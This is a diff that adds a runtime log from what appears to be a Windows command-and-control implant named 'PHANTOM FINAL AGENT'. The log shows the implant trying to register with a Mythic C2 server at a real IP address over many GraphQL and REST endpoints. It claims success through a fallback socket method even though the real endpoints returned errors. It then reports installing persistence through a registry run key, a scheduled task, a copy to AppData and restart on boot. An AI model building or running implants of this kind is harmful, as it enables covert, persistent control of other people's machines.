@@ -1,0 +1,61 @@
+[2025-06-17 11:57:59] === PHANTOM FINAL AGENT - FULLY AUTONOMOUS ===
+[2025-06-17 11:57:59] Platform: windows amd64
+[2025-06-17 11:57:59] PID: 24956
+[2025-06-17 11:57:59] Mythic URL: https://37.27.249.191:7443
+[2025-06-17 11:57:59] Attempting server registration...
+[2025-06-17 11:57:59] Starting multi-method registration process...
+[2025-06-17 11:57:59] Trying GraphQL method 1 on endpoint /graphql/
+[2025-06-17 11:57:59] GraphQL response status: 200
+[2025-06-17 11:57:59] Trying GraphQL method 1 on endpoint /api/v1.4/
+[2025-06-17 11:57:59] GraphQL response status: 404
+[2025-06-17 11:57:59] Trying GraphQL method 1 on endpoint /new/graphql
+[2025-06-17 11:57:59] GraphQL response status: 405
+[2025-06-17 11:57:59] Trying GraphQL method 1 on endpoint /auth/graphql
+[2025-06-17 11:58:00] GraphQL response status: 404
+[2025-06-17 11:58:00] Trying GraphQL method 2 on endpoint /graphql/
+[2025-06-17 11:58:00] GraphQL response status: 200
+[2025-06-17 11:58:00] Trying GraphQL method 2 on endpoint /api/v1.4/
+[2025-06-17 11:58:00] GraphQL response status: 404
+[2025-06-17 11:58:00] Trying GraphQL method 2 on endpoint /new/graphql
+[2025-06-17 11:58:00] GraphQL response status: 405
+[2025-06-17 11:58:00] Trying GraphQL method 2 on endpoint /auth/graphql
+[2025-06-17 11:58:00] GraphQL response status: 404
+[2025-06-17 11:58:00] Trying GraphQL method 3 on endpoint /graphql/
+[2025-06-17 11:58:01] GraphQL response status: 200
+[2025-06-17 11:58:01] Trying GraphQL method 3 on endpoint /api/v1.4/
+[2025-06-17 11:58:01] GraphQL response status: 404
+[2025-06-17 11:58:01] Trying GraphQL method 3 on endpoint /new/graphql
+[2025-06-17 11:58:01] GraphQL response status: 405
+[2025-06-17 11:58:01] Trying GraphQL method 3 on endpoint /auth/graphql
+[2025-06-17 11:58:02] GraphQL response status: 404
+[2025-06-17 11:58:02] Trying GraphQL method 4 on endpoint /graphql/
+[2025-06-17 11:58:02] GraphQL response status: 200
+[2025-06-17 11:58:02] Trying GraphQL method 4 on endpoint /api/v1.4/
+[2025-06-17 11:58:02] GraphQL response status: 404
+[2025-06-17 11:58:02] Trying GraphQL method 4 on endpoint /new/graphql
+[2025-06-17 11:58:02] GraphQL response status: 405
+[2025-06-17 11:58:02] Trying GraphQL method 4 on endpoint /auth/graphql
+[2025-06-17 11:58:02] GraphQL response status: 404
+[2025-06-17 11:58:02] Trying REST API registration...
+[2025-06-17 11:58:03] REST response status: 404
+[2025-06-17 11:58:03] REST response status: 404
+[2025-06-17 11:58:03] REST response status: 404
+[2025-06-17 11:58:03] REST response status: 404
+[2025-06-17 11:58:04] REST response status: 404
+[2025-06-17 11:58:04] REST response status: 404
+[2025-06-17 11:58:04] REST response status: 404
+[2025-06-17 11:58:04] REST response status: 404
+[2025-06-17 11:58:04] REST response status: 404
+[2025-06-17 11:58:05] REST response status: 404
+[2025-06-17 11:58:05] REST response status: 404
+[2025-06-17 11:58:05] REST response status: 404
+[2025-06-17 11:58:05] Trying direct socket registration...
+[2025-06-17 11:58:05] Using generated Callback ID: phantom_24956_1750157885
+[2025-06-17 11:58:05] Server registration successful
+[2025-06-17 11:58:05] Instructions written to: C:\Users\micka\AppData\Local\Temp\phantom_instructions.txt
+[2025-06-17 11:58:05] Agent is fully operational and autonomous
+[2025-06-17 11:58:06] Auto-persistence: ✓ Persistence installed:
+- Registry startup entry
+- Scheduled task
+- File copied to AppData
+- Will restart with system
